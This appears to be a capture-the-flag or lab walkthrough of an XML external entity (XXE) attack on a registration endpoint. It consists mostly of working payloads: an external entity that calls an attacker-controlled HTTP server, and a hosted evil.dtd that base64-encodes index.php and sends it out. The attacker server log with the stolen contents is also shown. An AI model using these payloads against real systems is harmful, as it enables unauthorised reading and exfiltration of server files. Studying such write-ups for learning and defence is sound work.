# Entry point

Example of an xml file that is passed to backend
```
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <method>POST</method>
  <uri>/auth/register</uri>
  <user>
    <username>username_value</username>
    <password>password_value</password>
  </user>
</root>
```

We can check for XXE vuln by declaring the following entity inside the ```<?xml>``` and hosting an http server
```
<!DOCTYPE test [ 
<!ENTITY % xxe SYSTEM "http://10.10.16.8"> 
%xxe;
]>
```
Attacker machine
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.192 - - [12/May/2023 12:35:19] "GET / HTTP/1.1" 200 -
```

# Exploitation

we can host a malicious evil.dtd that exfiltrates file contents
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.16.8/evil.dtd">%xxe;]>>
```
```
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.16.8/?exfil=%file;'>">
%eval;
%exfiltrate;
```
```
10.10.11.192 - - [12/May/2023 13:39:44] "GET /?exfil=PD9waHAKCnJlcXVpcmUgJy4uL2Jvb3RzdHJhcC5waHAnOwoKdXNlIGFwcFxjbGFzc2VzXFJvdXRlczsKdXNlIGFwcFxjbGFzc2VzXFVyaTsKCgokcm91dGVzID0gWwogICAgIi8iID0+ICJjb250cm9sbGVycy9pbmRleC5waHAiLAogICAgIi9sb2dpbiIgPT4gImNvbnRyb2xsZXJzL2xvZ2luLnBocCIsCiAgICAiL3JlZ2lzdGVyIiA9PiAiY29udHJvbGxlcnMvcmVnaXN0ZXIucGhwIiwKICAgICIvaG9tZSIgPT4gImNvbnRyb2xsZXJzL2hvbWUucGhwIiwKICAgICIvYWRtaW4iID0+ICJjb250cm9sbGVycy9hZG1pbi5waHAiLAogICAgIi9hcGkiID0+ICJjb250cm9sbGVycy9hcGkucGhwIiwKICAgICIvc2V0L3JvbGUvYWRtaW4iID0+ICJjb250cm9sbGVycy9zZXRfcm9sZV9hZG1pbi5waHAiLAogICAgIi9sb2dvdXQiID0+ICJjb250cm9sbGVycy9sb2dvdXQucGhwIgpdOwoKJHVyaSA9IFVyaTo6bG9hZCgpOwpyZXF1aXJlIFJvdXRlczo6bG9hZCgkdXJpLCAkcm91dGVzKTsK HTTP/1.1" 200 -
```
